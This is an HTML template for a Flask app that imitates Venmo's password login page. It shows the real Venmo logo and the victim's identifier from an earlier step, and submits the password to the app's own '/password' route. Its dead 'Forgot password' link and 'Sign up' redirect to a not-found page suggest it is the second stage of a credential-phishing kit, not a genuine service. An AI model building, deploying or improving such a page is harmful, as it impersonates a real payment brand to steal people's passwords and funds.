<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Venmo | Login</title>

  <link rel="icon" type="image/png" href="/venmo.jpg">

  <style>
    :root {
      --accent: #0087ff;
      --accent-deep: #006fe0;
      --muted: #6b7280;
      --bg: #fafbfd;
      --input-bg: #ffffff;
    }

    * { box-sizing: border-box; }
    html, body {
      height: 100%;
      margin: 0;
      font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
    }
    body {
      display: flex;
      align-items: center;
      justify-content: center;
      background: var(--bg);
      padding: 20px;
    }

    /* Card */
    .card {
      width: 100%;
      max-width: 420px;
      background: var(--bg);
      border-radius: 10px;
      padding: 32px 28px;
      box-shadow: 0 8px 26px rgba(16,24,40,0.06);
      border: 3px solid rgba(0, 3, 7, 0.04);
    }

    /* Logo */
    .logo-wrap {
      display: flex;
      justify-content: center;
      margin-bottom: 20px;
    }
    .logo-wrap img {
      width: 70px;
      height: auto;
    }

    h1 {
      font-size: 22px;
      margin-top: 20px;
      margin-bottom: 16px;
      line-height: 28px;
      text-align: center;
      font-weight: 500;
      color: #2F3033;
    }

    /* Identifier row */
    .identifier-row {
      display: flex;
      justify-content: center;
      flex-wrap: wrap;  /* ensures wrapping on small screens */
      align-items: center;
      gap: 6px;
      margin-bottom: 24px;
      font-size: 15px;
      color: #111827;
      text-align: center;
    }
    .identifier-row a {
      font-size: 14px;
      color: var(--accent);
      text-decoration: none;
      font-weight: 600;
    }
    .identifier-row a:hover { text-decoration: underline; }

    /* Form */
    form {
      display: flex;
      flex-direction: column;
      gap: 18px;
    }

    .form-group { position: relative; }
    .input {
      width: 100%;
      padding: 18px 14px 14px 14px;
      border-radius: 8px;
      border: 2px solid #7e8aa3;
      font-size: 16px;
      background: var(--input-bg);
      outline: none;
      height: 54px;
      transition: border-color .15s ease, box-shadow .15s ease;
    }
    .input:focus { 
      box-shadow: 0 0 0 6px rgba(0,135,255,0.06);
      border-color: var(--accent-deep);
    }

    .floating-label {
      position: absolute;
      left: 14px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 15px;
      color: var(--muted);
      pointer-events: none;
      transition: all 0.16s cubic-bezier(.2,.9,.2,1);
      padding: 0 6px;
      background: transparent;
    }
    .input:focus + .floating-label,
    .input:not(:placeholder-shown) + .floating-label {
      top: 8px;
      font-size: 12px;
      color: var(--accent);
      background: var(--input-bg);
    }

    /* Forgot password */
    .forgot {
      text-align: left;
      margin-top: -8px;
    }
    .forgot a {
      font-size: 14px;
      color: var(--accent);
      text-decoration: none;
      font-weight: 600;
    }
    .forgot a:hover { text-decoration: underline; }

    /* Buttons */
    .btn-row {
      display: flex;
      flex-direction: column;
      gap: 18px;
      margin-top: 10px;
    }
    .btn-primary {
      padding: 14px;
      border-radius: 28px;
      background: linear-gradient(180deg, var(--accent) 0%, var(--accent-deep) 100%);
      border: none;
      color: white;
      font-weight: 700;
      font-size: 15px;
      cursor: pointer;
      box-shadow: 0 4px 8px rgba(0,135,255,0.14);
    }
    .btn-secondary {
      padding: 14px;
      border-radius: 28px;
      border: 1px solid var(--accent);
      background: transparent;
      color: var(--accent);
      font-weight: 700;
      font-size: 15px;
      cursor: pointer;
    }

    /* Responsive tweaks */
    @media (max-width: 480px) { /* phones */
      .card { padding: 20px; }
      h1 { font-size: 20px; }
      .logo-wrap img { width: 60px; }
      .input { font-size: 15px; height: 50px; }
    }
    @media (min-width: 768px) and (max-width: 1024px) { /* tablets */
      .card { max-width: 500px; padding: 36px; }
      h1 { font-size: 24px; }
      .input { font-size: 17px; }
    }
  </style>
</head>
<body>
  <main class="card" role="main" aria-labelledby="pageTitle">
    <div class="logo-wrap">
      <img src="https://www.paypalobjects.com/paypal-ui/logos/svg/venmo-color.svg" alt="Venmo logo" />
    </div>

    <h1 id="pageTitle">Enter your password</h1>

    <!-- Identifier row -->
    <div class="identifier-row">
      {{ identifier }}
      <a href="{{ url_for('login_identifier') }}">Change</a>
    </div>

    <form method="POST" action="/password" autocomplete="off">
      <div class="form-group">
        <input id="password" class="input" type="password" name="password" placeholder=" " required />
        <label for="password" class="floating-label">Password</label>
      </div>

      <div class="forgot">
        <a href="#">Forgot password?</a>
      </div>

      <div class="btn-row">
        <button type="submit" class="btn-primary">Log in</button>
        <button type="button" class="btn-secondary" onclick="onSignup()">Sign up</button>
      </div>
    </form>
  </main>

  <script>
  function onSignup(){
    window.location.href = "/notfound";  // Redirect to Flask route that serves notfound.html
  }
  </script>
</body>
</html>
